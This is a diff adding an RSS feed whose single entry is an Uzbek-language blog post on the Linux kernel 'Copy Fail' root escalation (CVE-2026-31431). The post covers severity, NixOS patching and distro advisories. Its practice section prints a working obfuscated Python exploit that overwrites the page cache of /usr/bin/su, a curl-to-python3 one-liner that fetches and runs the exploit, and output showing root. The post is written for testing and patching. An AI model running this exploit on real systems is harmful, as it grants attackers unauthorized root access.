@@ -1,0 +1,137 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+    <channel>
+      <title>Meow</title>
+      <link>https://meow.uz</link>
+      <description></description>
+      <generator>Zola</generator>
+      <language>en</language>
+      <atom:link href="https://meow.uz/rss.xml" rel="self" type="application/rss+xml"/>
+      <lastBuildDate>Fri, 08 May 2026 00:00:00 +0000</lastBuildDate>
+      <item>
+          <title>Linux kernelida Copy Fail [uz]</title>
+          <pubDate>Fri, 08 May 2026 00:00:00 +0000</pubDate>
+          <author>msftyago</author>
+          <link>https://meow.uz/research/cve-2026-31431/</link>
+          <guid>https://meow.uz/research/cve-2026-31431/</guid>
+          <description xml:base="https://meow.uz/research/cve-2026-31431/">&lt;p&gt;&lt;a id=&quot;orgt5js9sn2&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;kirish&quot;&gt;Kirish&lt;&#x2F;h2&gt;
+&lt;p&gt;Habaringiz boʻlganidek Linux kerneli dasturiy manbaʼsida &lt;a href=&quot;https:&#x2F;&#x2F;copy.fail&#x2F;&quot;&gt;zaiflik&lt;&#x2F;a&gt; topildi. Ushbu zaiflik mahalliy foydalanuvchiga ruxsatsiz &lt;strong&gt;root&lt;&#x2F;strong&gt;&lt;sup&gt;&lt;a href=&quot;#org254e7s67y&quot;&gt;[1]&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt; huquqiga ega chiqish imkoniyatini beradi. 29-Aprel, 2026-yil sanasida eʼlon qilingan ushbu zaiflik, CVE tashkiloti tomonidan &lt;a href=&quot;https:&#x2F;&#x2F;www.cve.org&#x2F;CVERecord?id=CVE-2026-31431&quot;&gt;CVE-2026-31431&lt;&#x2F;a&gt; IDʼsida roʻyhatga olindi. &lt;a href=&quot;https:&#x2F;&#x2F;theori.io&#x2F;products&#x2F;xint&quot;&gt;Xint&lt;&#x2F;a&gt; va &lt;a href=&quot;https:&#x2F;&#x2F;theori.io&#x2F;&quot;&gt;Theori&lt;&#x2F;a&gt; bunga Copy Fail (Nusxa Zaifligi) deb nom berishdi.&lt;&#x2F;p&gt;
+&lt;p&gt;Maqolada biz zaiflik qanchalar jiddiyligi, qanday qilib tizimingizni himoya qilish, va ekspluatatsiyani qanday qilib amalda sinab koʻrishni NixOS doirasida koʻrib chiqamiz.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;a id=&quot;orgd6da96b&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;bu-qanchalar-jiddiy&quot;&gt;Bu qanchalar jiddiy?&lt;&#x2F;h2&gt;
+&lt;p&gt;Bu kabi &lt;strong&gt;LPE&lt;&#x2F;strong&gt;&lt;sup&gt;&lt;a href=&quot;#org254e7s67y&quot;&gt;[2]&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt; nuqsonliklarini tushunish uchun biz oddiy foydalanuvchi (yoki tizim) hisoblari va root oʻrtasidagi farqni bilishimiz darkor. Oddiy foydalanuvchi hisobida tizim darajasida oʻzgartirishlar qilish havfsizlik nuqtai nazaridan cheklangan boʻladi. Root esa bundan mustasno, kernel va tizim boʻylab har qanday harakatni amalga oshirishi mumkin. Shu sababdan ham root huquqiga ega chiqish parol bilan doimiy himoya qilinadi. Parollar esa &lt;code&gt;&#x2F;etc&#x2F;shadow&#x2F;&lt;&#x2F;code&gt; jildida hashlangan holatda saqlanib, kernel va &lt;strong&gt;fayl ruxsatlari&lt;&#x2F;strong&gt;&lt;sup&gt;&lt;a href=&quot;#org254e7s67y&quot;&gt;[3]&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt; ostida kuchli himoya qilinadi.&lt;&#x2F;p&gt;
+&lt;pre&gt;&lt;code&gt;normal-user$ cat &amp;#x2F;etc&amp;#x2F;shadow
+cat: &amp;#x2F;etc&amp;#x2F;shadow: Permission denied
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Copy Fail bu Linux kernel dasturiy manbanbasining &lt;code&gt;authencesn&lt;&#x2F;code&gt; kriptografik shablonida eʼtiborsiz qolib ketgan mantiqiy zaiflik. Bu zaiflik oddiy foydalanuvchiga, ruxsatsiz, diskdagi himoyalangan har qanday faylning 4-baytlik &lt;strong&gt;sahifa keshiga&lt;&#x2F;strong&gt;&lt;sup&gt;&lt;a href=&quot;#org254e7s67y&quot;&gt;[4]&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt; oʻzgartirish kiritish imkonini beradi. Kernel hech qachon buzilgan sahifani qayta yozish uchun nopok deb belgilamaydi, holbuki, diskdagi fayl oʻzgarishsiz qoladi va oddiy disk &lt;strong&gt;cheksum&lt;&#x2F;strong&gt;&lt;sup&gt;&lt;a href=&quot;#org254e7s67y&quot;&gt;[5]&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt; tekshiruvlari oʻzgarishni oʻtkazib yuboradi.&lt;&#x2F;p&gt;
+&lt;p&gt;Ammo, fayl ishlatilgan paytda oʻqiladigan narsa bu sahifa keshi, shunday qilib buzilgan versiya darhol tizim boʻylab ochiq holatga keladi. Va buni oddiy foydalanuvchi &lt;strong&gt;SetUID&lt;&#x2F;strong&gt;&lt;sup&gt;&lt;a href=&quot;#org254e7s67y&quot;&gt;[6]&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt; binaryʼsini yagona 732-baytlik Python dasturi orqali oʻzgartirish orqali rootʼga oʻtishi mumkin boʻladi. Huddi shu primitiv konteyner chegaralarini ham kesib o&#x27;tadi, chunki sahifa keshi butun host bo&#x27;ylab ochiq.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;a id=&quot;org254e4c3&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;hulosa&quot;&gt;Hulosa&lt;&#x2F;h3&gt;
+&lt;p&gt;Ushbu CVE koʻplab texnik tizimlarga havf soladi, koʻp-egalik linux hostlari, Kubernetes va konteyner klasterlari, CI runnerʼlar, Jenkins agentlari, va boshqa foydalanuvchi sifatida ishonchsiz kodlarni qabul qiluvchi tizimlar, Cloud SaaS tizimlari, har qanday linux server va host. Bularning muhimlilik darajasini &lt;a href=&quot;https:&#x2F;&#x2F;copy.fail&#x2F;#affected&quot;&gt;bu havola&lt;&#x2F;a&gt; orqali oʻtib koʻrishingiz mumkin.&lt;&#x2F;p&gt;
+&lt;p&gt;Taʼkidlash joizki:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Professional dasturiy muhandislarning 47 foizi Linux ustiga qurilgan operatsion tizimdan foydalanishadi. (Statista)&lt;&#x2F;li&gt;
+&lt;li&gt;Web saytlarning 39.2 foizidan koʻpi. (W3Techs)&lt;&#x2F;li&gt;
+&lt;li&gt;Linux dunyodagi mobil smartfonlarning 85 foizini taʼminlaydi. (Hayden James)&lt;&#x2F;li&gt;
+&lt;li&gt;Linuxning bozordagi desktop ulushi 2.09 foiz bilan uchinchi oʻrinda. (Statista)&lt;&#x2F;li&gt;
+&lt;li&gt;Dunyoning eng tez 500 superkompyuterlarining barchasi Linux ishlatadi. (Blackdown)&lt;&#x2F;li&gt;
+&lt;li&gt;Dunyodagi eng yuqori 1 million web serverlar Linuxdan foydalanadi. (ZDNet)&lt;&#x2F;li&gt;
+&lt;li&gt;Bugungi kunga kelib, dunyoda 600 faol Linux distributivlari mavjud. (Tecmint)&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;Bularning barchasi aynan CVE-2026-31431ʼni boshqa LPE CVEʼlardan ajratib turadi.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;a id=&quot;orga3da529&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;yechimi-qanday&quot;&gt;Yechimi qanday?&lt;&#x2F;h2&gt;
+&lt;p&gt;Ayni vaqtda barcha tashkilotlar tomonidan tuzatish ishlari olib borilmoqda, tuzatish kiritilgan kernel talqinlari esa yuqori oqimda yangilanmoqda.&lt;&#x2F;p&gt;
+&lt;p&gt;Bu maqolada biz NixOS doirasida yechim turlari bilan tanishamiz, agar siz boshqa distibyutivdan foydalansangiz &lt;a href=&quot;https:&#x2F;&#x2F;meow.uz&#x2F;research&#x2F;cve-2026-31431&#x2F;#orge9a34af&quot;&gt;ushbu boʻlimga&lt;&#x2F;a&gt; yuzlaning.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;a id=&quot;orgb0e6638&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;nixos&quot;&gt;NixOS&lt;&#x2F;h3&gt;
+&lt;p&gt;NixOSʻga keladigan boʻlsak &lt;code&gt;25.11&lt;&#x2F;code&gt; talqinida belgilangan kernel zararlangan.&lt;&#x2F;p&gt;
+&lt;p&gt;Kernelingiz talqinini bilish uchun quyidagi buyruqlarning biridan foydalanishingiz mumkin:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nix-shell -p nix-info --run &amp;quot;nix-info -m&amp;quot;
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;uname -a
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Va buyruq qaytargan maʻlumotdagi kernel talqinini quyidagi jadvalga solishtiring. Agar sizning talqiningiz jadvalda mavjud boʻlmasa siz&lt;&#x2F;p&gt;
+&lt;div style={{ display: &#x27;flex&#x27;, justifyContent: &#x27;center&#x27; }}&gt;
+&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th style=&quot;text-align: center&quot;&gt;Zaiflik bartaraf etilgan kernel talqinlari:&lt;&#x2F;th&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;thead&gt;&lt;tbody&gt;
+&lt;tr&gt;&lt;td style=&quot;text-align: center&quot;&gt;v6.18.22&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td style=&quot;text-align: center&quot;&gt;v6.18.23&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td style=&quot;text-align: center&quot;&gt;v6.18.24&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td style=&quot;text-align: center&quot;&gt;v6.18.25&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td style=&quot;text-align: center&quot;&gt;v6.19.12&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td style=&quot;text-align: center&quot;&gt;v6.19.13&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td style=&quot;text-align: center&quot;&gt;v6.19.14&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td style=&quot;text-align: center&quot;&gt;v7.0&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td style=&quot;text-align: center&quot;&gt;v7.0.1&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td style=&quot;text-align: center&quot;&gt;v7.0.2&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td style=&quot;text-align: center&quot;&gt;v7.0-rc7&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td style=&quot;text-align: center&quot;&gt;v7.1-rc1&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https:&#x2F;&#x2F;news.ycombinator.com&#x2F;item?id=47953600&quot;&gt;manba&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;&#x2F;tbody&gt;&lt;&#x2F;table&gt;
+&lt;&#x2F;div&gt;
+&lt;p&gt;&lt;code&gt;nixos-25.11&lt;&#x2F;code&gt; yangilaniga qadar &lt;code&gt;nixpkgs.url&lt;&#x2F;code&gt;da belgilangan NixOS oqim talqinini &lt;code&gt;release-25.11&lt;&#x2F;code&gt;ga oʻzgartiring.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;nix&quot; class=&quot;language-nix &quot;&gt;&lt;code class=&quot;language-nix&quot; data-lang=&quot;nix&quot;&gt;nixpkgs.url = &amp;quot;github:nixos&amp;#x2F;nixpkgs&amp;#x2F;release-25.11&amp;quot;;
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Keyin &lt;code&gt;nixos-reboot&lt;&#x2F;code&gt; orqali yangilanishlarni eʻlon qilib, qurilmangizni oʻchirib yoqing. Endi kernel talqiningiz &lt;code&gt;6.12.85&lt;&#x2F;code&gt;ga yangilangan boʻlishi kerak.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;a id=&quot;orge9a34af&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;boshqa-distributivlar&quot;&gt;Boshqa distributivlar&lt;&#x2F;h3&gt;
+&lt;p&gt;CVEʼga javoban, Linux distribyutorlari o&#x27;zlarining rasmiy maslahatlarini chiqarishmoqdalar, bulardan bir nechtasi:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;explore.alas.aws.amazon.com&#x2F;CVE-2026-31431.html&quot;&gt;Amazon Linux&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;security.archlinux.org&#x2F;CVE-2026-31431&quot;&gt;Arch Linux&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;security-tracker.debian.org&#x2F;tracker&#x2F;CVE-2026-31431&quot;&gt;Debian&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;bugs.gentoo.org&#x2F;show_bug.cgi?id=CVE-2026-31431&quot;&gt;Gentoo&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;access.redhat.com&#x2F;security&#x2F;cve&#x2F;cve-2026-31431&quot;&gt;Red Hat&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.suse.com&#x2F;security&#x2F;cve&#x2F;CVE-2026-31431.html&quot;&gt;Ubuntu&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.suse.com&#x2F;security&#x2F;cve&#x2F;CVE-2026-31431.html&quot;&gt;SUSE&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;&lt;a id=&quot;org2d9a4c8&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;amaliyot&quot;&gt;Amaliyot&lt;&#x2F;h2&gt;
+&lt;p&gt;Kontseptsiya isboti ommaga taqdim etilgan, bu sizga oʻz tizimingizni sinovdan oʻtkazish imkoniyatini beradi, bu bilan tepada bajargan tuzatishimizni ishlaganini tekshirib olsak boʻladi.&lt;&#x2F;p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Ushbu amaliyot bilan masʼuliyatli boʻling. Faqatgina oʻz qurilmalaringiz va yozma ruxsatingiz bor qurilmalarda ishlating. Dastur SetUID sahifa keshi binaryʼsini oʻzgartiradi; oʻzgarish qurilma oʻchib-yonishidan soʻng saqlanib qolmaydi, lekin rootʼga oʼtishi maʼlum. Ish muhitidagi qurilmalarda ishlatmang.&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;p&gt;Bu esa dasturning oʻzi:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;#!&amp;#x2F;usr&amp;#x2F;bin&amp;#x2F;env python3
+import os as g,zlib,socket as s
+def d(x):return bytes.fromhex(x)
+def c(f,t,c):
+ a=s.socket(38,5,0);a.bind((&amp;quot;aead&amp;quot;,&amp;quot;authencesn(hmac(sha256),cbc(aes))&amp;quot;));h=279;v=a.setsockopt;v(h,1,d(&amp;#x27;0800010000000010&amp;#x27;+&amp;#x27;0&amp;#x27;*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d(&amp;#x27;00&amp;#x27;);u.sendmsg([b&amp;quot;A&amp;quot;*4+c],[(h,3,i*4),(h,2,b&amp;#x27;\x10&amp;#x27;+i*19),(h,4,b&amp;#x27;\x08&amp;#x27;+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
+ try:u.recv(8+t)
+ except:0
+f=g.open(&amp;quot;&amp;#x2F;usr&amp;#x2F;bin&amp;#x2F;su&amp;quot;,0);i=0;e=zlib.decompress(d(&amp;quot;78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3&amp;quot;))
+while i&amp;lt;len(e):c(f,i,e[i:i+4]);i+=4
+g.system(&amp;quot;su&amp;quot;)
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Tizimingizda Python3 oʻrnatilganiga ishonch hosil qiling. NixOSʻda boʻlsa &lt;code&gt;nix-shell&lt;&#x2F;code&gt; orqali vaqtinchalik yuklab olsangiz boʻladi:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nix-shell -p python3
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;NixOS tizimida &lt;code&gt;&#x2F;usr&#x2F;bin&lt;&#x2F;code&gt; mavjud emasligini hisobga olib, 8-qatordagi &lt;code&gt;&#x2F;usr&#x2F;bin&#x2F;su&lt;&#x2F;code&gt;ni &lt;strong&gt;flake&lt;&#x2F;strong&gt;&lt;sup&gt;&lt;a href=&quot;#&quot;&gt;[7]&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt; orqali yaratilgan &lt;code&gt;venv&#x2F;bin&#x2F;python&lt;&#x2F;code&gt; yoki &lt;code&gt;env&#x2F;bin&#x2F;python&lt;&#x2F;code&gt; manziliga yoʻnaltiring. Bunga muqobil holatda ushbu buyruqdan foydalansangiz boʻladi:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;curl https:&amp;#x2F;&amp;#x2F;copy.fail&amp;#x2F;exp | sed &amp;#x27;s|&amp;#x2F;usr&amp;#x2F;bin&amp;#x2F;su|&amp;#x2F;run&amp;#x2F;current-system&amp;#x2F;sw&amp;#x2F;bin&amp;#x2F;su|g&amp;#x27; | python3 &amp;amp;&amp;amp; su
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;a id=&quot;orge0db9cb&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;qisqa-tahlil&quot;&gt;Qisqa tahlil&lt;&#x2F;h3&gt;
+&lt;p&gt;Agar dasturni ishlatishga imkoningiz boʻlmagan boʻlsa quyidagi terminal qaytargan maʻlumotdan qisqacha tushuncha olsangiz boʻladi:&lt;&#x2F;p&gt;
+&lt;pre&gt;&lt;code&gt;$ curl https:&amp;#x2F;&amp;#x2F;copy.fail&amp;#x2F;exp | python3 &amp;amp;&amp;amp; su
+$ id
+uid=0(root) gid=1002(user) groups=1002(user)
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;code&gt;uid=0(root)&lt;&#x2F;code&gt; — dastur muvaffaqiyatli root hisobiga kirib borganini anglatadi. Foydalanuvchi hisobidan turib ishga tushirgan boʻlsakda parol soʻramaganini hisobga oling.&lt;&#x2F;p&gt;
+&lt;p&gt;Va eʼtibor bergan boʻlsangiz &lt;code&gt;gid&lt;&#x2F;code&gt; va &lt;code&gt;groups&lt;&#x2F;code&gt; 1002ga teng, yaʼni, foydalanuvchi faqatgina user guruhida boʻlishiga qaramasdan &lt;code&gt;uid&lt;&#x2F;code&gt; noʻlga teng. Bu sogʻlom tizim uchun gʻayritabiiy.&lt;&#x2F;p&gt;
+&lt;hr &#x2F;&gt;
+&lt;p&gt;&lt;a id=&quot;org254e7s67y&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;ma-lumotnomalar&quot;&gt;Ma&#x27;lumotnomalar&lt;&#x2F;h2&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Superuser&quot;&gt;Root&lt;&#x2F;a&gt; — super foydalanuvchi&#x2F;administrator huquqiga ega hisob. &lt;a href=&quot;https:&#x2F;&#x2F;meow.uz&#x2F;research&#x2F;cve-2026-31431&#x2F;#orgt5js9sn2&quot;&gt;ortga ▲&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Privilege_escalation&quot;&gt;Local Priviledge Escalation&lt;&#x2F;a&gt; — Mahalliy Huquq Buzilishi. &lt;a href=&quot;https:&#x2F;&#x2F;meow.uz&#x2F;research&#x2F;cve-2026-31431&#x2F;#orgt5js9sn2&quot;&gt;ortga ▲&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;File-system_permissions&quot;&gt;Linux permissions model&lt;&#x2F;a&gt; — tizimning fundamental himoya tuzilmasi. &lt;a href=&quot;https:&#x2F;&#x2F;meow.uz&#x2F;research&#x2F;cve-2026-31431&#x2F;#orgd6da96b&quot;&gt;ortga ▲&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Page_cache&quot;&gt;Page Cache&lt;&#x2F;a&gt; — &lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Page_(computer_memory)&quot;&gt;Sahifa&lt;&#x2F;a&gt; Keshi. Diskdagi maʼlumotlarni protsessor tezligiga oshirishda oʻrtakash vasifasini bajaradi, sodda qilib aytganda. &lt;a href=&quot;https:&#x2F;&#x2F;meow.uz&#x2F;research&#x2F;cve-2026-31431&#x2F;#orgd6da96b&quot;&gt;ortga ▲&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Checksum&quot;&gt;Checksum&lt;&#x2F;a&gt; — Malumot almashinuvi vaqtidagi hatoliklarni aniqlash usuli. &lt;a href=&quot;https:&#x2F;&#x2F;meow.uz&#x2F;research&#x2F;cve-2026-31431&#x2F;#orgd6da96b&quot;&gt;ortga ▲&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Setuid&quot;&gt;Set User ID&lt;&#x2F;a&gt; — Foydalanuvchi Identifikatsiyasini oʻrnatish. Manba: &lt;a href=&quot;https:&#x2F;&#x2F;books.google.com&#x2F;books?id=uRW8V9QOL7YC&amp;amp;q=setuid&amp;amp;pg=PT375&quot;&gt;Essential System Administration O&#x27;Reilly. 351-bet&lt;&#x2F;a&gt;. &lt;a href=&quot;https:&#x2F;&#x2F;meow.uz&#x2F;research&#x2F;cve-2026-31431&#x2F;#orgd6da96b&quot;&gt;ortga ▲&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;&#x2F;learn&#x2F;introduction-to-flakes&quot;&gt;Flake&lt;&#x2F;a&gt; — Fleyklar NixOSʻda tizim bogʻliklarini boshqarish uchun keng qamrovli vosita. &lt;a href=&quot;https:&#x2F;&#x2F;meow.uz&#x2F;research&#x2F;cve-2026-31431&#x2F;#org2d9a4c8&quot;&gt;ortga ▲&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+</description>
+      </item>
+    </channel>
+</rss>
